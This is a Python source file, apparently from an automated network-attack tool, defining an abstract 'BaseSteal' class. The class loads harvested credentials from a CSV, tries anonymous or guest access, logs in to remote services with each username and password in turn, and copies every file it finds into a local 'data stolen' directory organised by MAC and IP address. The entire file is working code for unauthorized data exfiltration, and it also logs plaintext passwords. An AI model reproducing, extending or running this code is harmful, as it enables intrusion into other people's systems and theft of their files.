"""
base_steal.py - Base class for steal operations. Provides the common flow
for stealing files/data from remote services. Subclasses implement protocol-specific
connect, find_items, and steal_item methods.
"""

import os
import logging
import time
from threading import Timer
from abc import ABC, abstractmethod
from shared import SharedData
from logger import Logger

logger = Logger(name="base_steal.py", level=logging.DEBUG)

b_class = None
b_module = None
b_status = None
b_port = None
b_parent = None
b_action = None
b_target = None


class BaseSteal(ABC):
    protocol_name = ""
    credential_file_attr = ""
    default_root_path = "/"

    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.connected = False
            self.stop_execution = False
            self.b_parent_action = None
            logger.info(f"{self.__class__.__name__} initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    @abstractmethod
    def connect(self, ip, username, password):
        """Establish connection. Return connection object or None."""
        pass

    @abstractmethod
    def find_items(self, conn, dir_path):
        """Find items (files or tables) on remote system. Return list."""
        pass

    @abstractmethod
    def steal_item(self, conn, remote_item, local_dir):
        """Steal/download a single item."""
        pass

    def try_anonymous(self, ip):
        """Override to support anonymous/guest access. Return connection or None."""
        return None

    def disconnect(self, conn):
        """Override if protocol needs connection cleanup."""
        pass

    def parse_credentials(self, ip):
        """Parse credentials from CSV. Default: parts[1]==ip, store (parts[3], parts[4])."""
        filepath = getattr(self.shared_data, self.credential_file_attr, None)
        credentials = []
        if filepath and os.path.exists(filepath):
            with open(filepath, 'r') as f:
                lines = f.readlines()[1:]
                for line in lines:
                    parts = line.strip().split(',')
                    if parts[1] == ip:
                        credentials.append((parts[3], parts[4]))
        return credentials

    def build_local_dir(self, mac, ip, username=None):
        base = os.path.join(self.shared_data.datastolendir, f"{self.protocol_name}/{mac}_{ip}")
        if username:
            return os.path.join(base, username)
        return base

    def execute(self, ip, port, row, status_key):
        try:
            if self.b_parent_action:
                if 'success' not in row.get(self.b_parent_action, ''):
                    return 'skipped'

            self.shared_data.orch_status = self.__class__.__name__
            time.sleep(5)
            logger.info(f"Stealing files from {ip}:{port}...")

            credentials = self.parse_credentials(ip)

            if not credentials:
                conn = self.try_anonymous(ip)
                if not conn:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'
                self.disconnect(conn)

            def timeout():
                if not self.connected:
                    logger.error(f"No connection established within 4 minutes for {ip}. Marking as failed.")
                    self.stop_execution = True

            timer = Timer(240, timeout)
            timer.start()

            success = False

            conn = self.try_anonymous(ip)
            if conn:
                items = self.find_items(conn, self.default_root_path)
                mac = row['MAC Address']
                local_dir = self.build_local_dir(mac, ip, 'anonymous')
                if items:
                    for item in items:
                        if self.stop_execution:
                            break
                        self.steal_item(conn, item, local_dir)
                    success = True
                    logger.success(f"Successfully stolen {len(items)} files from {ip}:{port} via anonymous access")
                self.disconnect(conn)
                if success:
                    timer.cancel()

            if not success:
                for username, password in credentials:
                    if self.stop_execution or getattr(self.shared_data, 'orchestrator_should_exit', False):
                        logger.info("Steal files execution interrupted.")
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip}")
                        conn = self.connect(ip, username, password)
                        if conn:
                            items = self.find_items(conn, self.default_root_path)
                            mac = row['MAC Address']
                            local_dir = self.build_local_dir(mac, ip)
                            if items:
                                for item in items:
                                    if self.stop_execution or getattr(self.shared_data, 'orchestrator_should_exit', False):
                                        break
                                    self.steal_item(conn, item, local_dir)
                                success = True
                                logger.success(f"Successfully stolen {len(items)} files from {ip}:{port} using {username}")
                            self.disconnect(conn)
                            if success:
                                timer.cancel()
                                return 'success'
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with username {username}: {e}")

            if not success:
                logger.error(f"Failed to steal any files from {ip}:{port}")
                return 'failed'
            return 'success'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'
